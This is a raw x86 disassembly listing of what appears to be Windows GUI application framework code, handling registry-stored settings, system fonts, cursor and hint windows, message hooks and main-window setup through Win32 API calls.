push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_40af18
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_45da44
test al al
je r-xdata
xor eax eax
push ebp
push sub_44415f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4057a0
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4057a0
sub_444214
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_447038
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_446d9c
mov dl 0x1
mov eax [ rw-data ]
call sub_446d9c
sub_444280
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_4442a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_444280
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
movzx eax [ esp ]
mov [ esp + 0x8 ] ax
movzx eax [ esp + 0x4 ]
mov [ esp + 0xa ] ax
mov eax [ esp + 0x8 ]
push eax
push 0x0
push 0x84
push edi
call SendMessageA
movzx eax ax
or eax 0x2000000
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_444344
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_44448b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_446d9c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_424978
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_424978
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_424a5c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_424978
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_424978
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_424978
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
movzx edx [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_446d9c
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_4246fc
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_4246fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444492
cmp [ rw-data ] 0x0
je r-xdata
sub_4444c8
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
dec cl
je r-xdata
mov eax esi
call sub_43dfbc
mov ebx eax
mov eax edi
call sub_43dfbc
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_43dfbc
mov ebx eax
add ebx [ edi + 0x4c ]
mov eax esi
call sub_43dfbc
add eax [ esi + 0x4c ]
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
mov eax esi
call sub_43df9c
mov ebx eax
mov eax edi
call sub_43df9c
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
mov eax edi
call sub_43df9c
mov ebx eax
add ebx [ edi + 0x48 ]
mov eax esi
call sub_43df9c
add eax [ esi + 0x48 ]
cmp ebx eax
setl al
jmp r-xdata
sub_444550
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
movzx eax [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
movzx eax [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x273 ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax ebx
call sub_43df9c
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_43dfbc
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x88 ]
cmp [ ebx + 0x273 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
movzx eax [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
movzx edx [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_444696 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_44470c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_443e20
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
movzx eax [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_419898
movzx edx [ ebp - 0x1 ]
call sub_444550
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_443e0c
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
movzx eax [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x273 ] 0x1
je r-xdata
cmp [ ebx + 0x273 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419740
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_419914
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_419898
mov edx eax
movzx ecx [ ebp - 0x1 ]
mov eax ebx
call sub_4444c8
test al al
je r-xdata
inc esi
sub_44485c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_443e20
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_443e0c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x273 ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_4448b4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_44485c
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44492e
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_44470c
pop ecx
push ebp
mov al 0x2
call sub_44470c
pop ecx
push ebp
mov al 0x3
call sub_44470c
pop ecx
push ebp
mov al 0x4
call sub_44470c
pop ecx
push ebp
mov al 0x5
call sub_44470c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_404650
retn
sub_44493c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_444498
xor eax eax
push ebp
push sub_4449b5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4448b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_4444a0
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4449d0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_405530
pop esi
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x84 ]
call sub_405584
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_444a28
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_444a59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4473f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_444a7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_44edd8
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_4474a4
sub_444ad8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4463e8
sub_444b1c
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xad ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_444ad8
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_444a7c
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_444b90
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_444bec
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_444c1c
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_444c44
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_444bec
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_444c1c
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_444c1c
sub_444c74
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x58 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x58 ]
mov edx esi
call sub_419898
call sub_404650
inc esi
dec ebx
jne r-xdata
sub_444cd0
push ebx
push esi
push edi
push ebp
mov edi eax
xor ebp ebp
mov eax edi
call sub_443dd4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
call sub_444cac
mov eax edi
call sub_443dd4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_443dc0
mov ebp eax
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_443dc0
mov ebp eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_443dc0
call sub_443b34
test al al
je r-xdata
mov edx ebx
mov eax edi
call sub_443dc0
call sub_443b34
test al al
je r-xdata
sub_444d60
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41ffc4
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_404974
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4467a4
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x98 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0xb0 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0xa5 ] 0x1
mov [ ebx + 0xbc ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42aec8
mov esi eax
mov [ ebx + 0xa0 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_42b29c
mov eax [ ebx + 0xa0 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_447074
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40ea38
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4469b0
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40ea6c
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_40a8bc
lea eax [ ebp - 0x101 ]
push eax
call CharNextA
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4057a0
mov [ ebx + 0xd4 ] 0x0
push ebx
push sub_446488
call sub_421140
mov [ ebx + 0xc8 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0xa6 ] 0x1
xor eax eax
mov [ ebx + 0xa8 ] eax
mov eax ebx
call sub_44724c
mov eax ebx
call sub_447db0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_4450b4
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_444f79
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_404a1c
mov ebx edx
mov esi eax
mov eax esi
call sub_447dc0
mov [ esp + 0x4 ] esi
mov [ esp ] sub_4467a4
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_4469b0
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa8 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0xa5 ] 0x0
mov eax esi
call sub_4474a4
xor edx edx
mov eax esi
call sub_446d9c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
mov eax [ esi + 0xc8 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
push esi
push sub_445780
mov eax esi
call sub_4466b8
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
call sub_4211f4
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xac ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_40700c
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xb0 ]
call sub_404650
mov eax [ esi + 0x90 ]
call sub_404650
mov eax [ esi + 0x98 ]
call sub_404650
mov eax [ esi + 0xa0 ]
call sub_404650
test bl bl
jle r-xdata
call sub_42111c
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_4450b4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_445250
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xac ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445257
lea eax [ ebp - 0x2c ]
call sub_405530
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_4458cc
call sub_421084
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x84ca0000
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4059dc
mov ecx eax
mov edx [ rw-data ]
mov eax 0x8000000
call sub_40857c
mov [ ebx + 0x30 ] eax
mov [ ebx + 0xac ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_445f74
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_445f74
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_44525c
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_443e28
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_4452bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_419740
jmp r-xdata
